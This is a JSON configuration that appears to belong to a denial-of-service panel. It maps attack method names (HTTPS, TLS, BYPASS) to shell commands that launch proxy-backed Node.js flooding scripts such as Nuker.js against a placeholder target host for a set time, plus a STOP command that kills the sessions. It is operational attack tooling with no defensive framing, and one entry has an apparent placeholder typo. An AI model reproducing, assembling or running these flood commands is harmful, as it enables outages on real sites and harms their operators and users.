[
    {
        "methods": "HTTPS",
        "command": "cd /root/methods/layer7/ && [SCREEN_DM] node prx.js && [SCREEN_CMD] node HTTPS.js [HOST] [TIME] 128 5 prx.txt"
    },
    {
        "methods": "TLS",
        "command": "cd /root/methods/layer7/ && [SCREEN_CMD] node prx.js && [SCREEN_CMD] node TLS-DETECT.js [HOST] [TIME] 128 8 prx.txt"
    },
    {
        "methods": "BYPASS",
        "command": "cd /root/methods/layer7/ && [SCREEN_CMD] node prx.js && [SCREEN_CMD] node Nuker.js [HOST] [TIME] 10 prx.txt 128"
    },
    {
        "methods": "STOP",
        "command": "pkill -f [SCREEN_NAME]"
    }
]